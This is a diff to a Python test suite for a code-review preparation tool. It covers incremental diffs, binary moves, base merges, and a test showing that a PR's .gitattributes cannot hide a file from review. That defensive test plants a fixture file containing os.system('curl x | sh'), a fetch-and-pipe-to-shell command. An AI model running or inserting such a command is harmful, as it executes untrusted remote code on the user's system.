@@ -180,24 +180,17 @@ class IncrementalContext(unittest.TestCase):
                 self.assertEqual(result.modo, "incremental")
                 self.assertIn("x.py", result.hechos.reverted_paths)
 
-    def test_rename_keeps_old_and_new_blobs_verified(self):
+    def test_moving_a_binary_in_a_later_push_still_prepares(self):
         with tempfile.TemporaryDirectory() as tmp:
             repo = hacer_repo(tmp)
-            (repo / "readme.md").write_text("# proyecto\n")
+            (repo / "a.py").write_text("a = 1\n")
+            (repo / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(range(256)))
             base = commit(repo, "base")
-            (repo / "k.py").write_text("".join(lineas(20, "k_")))
+            (repo / "a.py").write_text("a = 2\n")
             prev = commit(repo, "prev")
-            git(repo, "mv", "k.py", "m.py")
-            reescrito = lineas(20, "k_")
-            reescrito[5] = "k_cambiada = 99\n"
-            reescrito.extend(["k_extra_a = 1\n", "k_extra_b = 2\n"])
-            (repo / "m.py").write_text("".join(reescrito))
+            (repo / "assets").mkdir()
+            git(repo, "mv", "logo.png", "assets/logo.png")
             head = commit(repo, "head")
-            estado = git(repo, "diff", "--name-status", "-M", prev, head)
-            self.assertEqual(len(estado.splitlines()), 1)
-            self.assertTrue(estado.startswith("R"), estado)
-            blob_prev = git(repo, "rev-parse", f"{prev}:k.py")
-            blob_head = git(repo, "rev-parse", f"{head}:m.py")
             policy = domain.ReviewPolicy(diff_mode="incremental")
             digest = digest_de_politica(policy)
             result = prepare_review(
@@ -207,11 +200,10 @@ class IncrementalContext(unittest.TestCase):
                 policy,
             )
             self.assertEqual(result.modo, "incremental")
-            self.assertEqual(result.hechos.renames, (("m.py", "k.py"),))
-            self.assertIn(("k.py", blob_prev), result.hechos.blobs)
-            self.assertIn(("m.py", blob_head), result.hechos.blobs)
-            self.assertEqual(set(result.plan.changed_paths), {"m.py"})
-            self.assertEqual(set(result.hechos.changed_paths), {"m.py"})
+            self.assertIn(
+                review_context.Omission(ruta="assets/logo.png", causa="filtro *.png"),
+                result.omisiones,
+            )
 
     def test_mode_forcing_keeps_the_real_delta(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -294,6 +286,48 @@ class IncrementalContext(unittest.TestCase):
             self.assertIn("antecesor = 1", result.partes["z_antecesor.py"])
             self.assertNotIn("a_0 = 0", result.partes["y_correccion.py"])
             self.assertEqual(result.hechos.changed_paths, ("y_correccion.py",))
+
+    def test_merging_the_base_into_the_pr_reviews_only_the_pr_changes(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = hacer_repo(tmp)
+            (repo / "shared.py").write_text("".join(lineas(40, "linea")))
+            (repo / "solo_base.py").write_text("m = 1\n")
+            commit(repo, "base")
+            git(repo, "checkout", "-q", "-b", "pr")
+            texto = (repo / "shared.py").read_text()
+            (repo / "shared.py").write_text(
+                texto.replace("linea2 = 2", "linea2 = 'pr'")
+            )
+            prev = commit(repo, "pr")
+            git(repo, "checkout", "-q", "main")
+            texto = (repo / "shared.py").read_text()
+            (repo / "shared.py").write_text(
+                texto.replace("linea35 = 35", "linea35 = 'main'")
+            )
+            (repo / "solo_base.py").write_text("m = 'main'\n")
+            base_nueva = commit(repo, "avanza base")
+            git(repo, "checkout", "-q", "pr")
+            git(repo, "merge", "-q", "--no-edit", "main")
+            head = git(repo, "rev-parse", "HEAD")
+            policy = domain.ReviewPolicy(diff_mode="incremental")
+            digest = digest_de_politica(policy)
+            result = prepare_review(
+                GitRepository(repo),
+                solicitud(head, base_nueva, digest),
+                memoria(prev, base_nueva, digest),
+                policy,
+                cobertura_previa={
+                    "shared.py": git(repo, "rev-parse", f"{prev}:shared.py")
+                },
+            )
+            self.assertEqual(result.modo, "incremental")
+            self.assertEqual([p.text for p in result.entregados], ["shared.py"])
+            cambios = [
+                linea
+                for linea in result.partes["shared.py"].splitlines()
+                if linea[:1] in "+-" and not linea.startswith(("+++", "---"))
+            ]
+            self.assertEqual(cambios, ["-linea2 = 2", "+linea2 = 'pr'"])
 
     def test_strict_budget_leaves_obligation_pending(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -467,6 +501,28 @@ def hacer_repo_selectivo(tmp):
     )
     head = commit(repo, "head")
     return repo, base, prev, head
+
+
+class AtributosDeGit(unittest.TestCase):
+    def test_gitattributes_del_pr_no_oculta_un_archivo(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = hacer_repo(tmp)
+            (repo / "a.py").write_text("a = 1\n")
+            base = commit(repo, "base")
+            (repo / "payload.py").write_text("import os\nos.system('curl x | sh')\n")
+            (repo / ".gitattributes").write_text("payload.py -diff\n")
+            head = commit(repo, "pr")
+            policy = domain.ReviewPolicy(diff_mode="incremental")
+            digest = digest_de_politica(policy)
+            result = prepare_review(
+                GitRepository(repo),
+                solicitud(head, base, digest),
+                memoria_vacia(),
+                policy,
+            )
+            self.assertEqual(result.modo, "full")
+            self.assertIn("payload.py", [p.text for p in result.entregados])
+            self.assertIn("+os.system('curl x | sh')", result.partes["payload.py"])
 
 
 class ContinuationContext(unittest.TestCase):
